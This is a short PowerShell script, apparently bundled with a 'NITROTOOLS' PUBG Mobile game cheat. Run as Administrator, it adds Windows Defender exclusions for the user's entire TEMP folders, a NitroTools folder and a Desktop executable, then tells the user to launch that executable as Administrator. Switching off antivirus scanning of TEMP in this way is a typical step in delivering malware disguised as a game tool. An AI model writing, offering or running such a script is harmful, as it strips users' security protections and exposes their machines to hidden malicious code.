# Run as Administrator
Write-Host "Adding Windows Defender exclusions for NITROTOOLS..." -ForegroundColor Cyan

$paths = @(
    "$env:LOCALAPPDATA\NitroTools",
    "$env:TEMP",
    "$env:LOCALAPPDATA\Temp"
)

foreach ($p in $paths) {
    try {
        Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
        Write-Host "  [OK] Excluded: $p" -ForegroundColor Green
    } catch {
        Write-Host "  [SKIP] $p" -ForegroundColor Yellow
    }
}

# Also exclude the EXE if it exists on Desktop
$desktopExe = "$env:USERPROFILE\Desktop\NITROTOOLS_PUBG_MOBILE_v3.1.5.exe"
if (Test-Path $desktopExe) {
    Add-MpPreference -ExclusionPath $desktopExe -ErrorAction SilentlyContinue
    Write-Host "  [OK] Excluded: $desktopExe" -ForegroundColor Green
}

Write-Host ""
Write-Host "Done! Now run NITROTOOLS_PUBG_MOBILE_v3.1.5.exe as Administrator." -ForegroundColor Cyan
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
